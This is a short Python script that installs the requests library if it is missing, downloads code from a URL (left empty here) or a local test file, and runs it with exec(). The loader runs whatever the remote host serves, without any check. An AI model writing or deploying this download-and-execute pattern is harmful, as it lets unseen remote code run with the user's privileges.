import pip

test_mode = False

def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])

try:
    import requests
except:
    install("requests")
    import requests

if test_mode == False:
    r = requests.get("https://").text
else:
    with open("onlineside.py","r") as f:
        r = f.read()

exec(r)
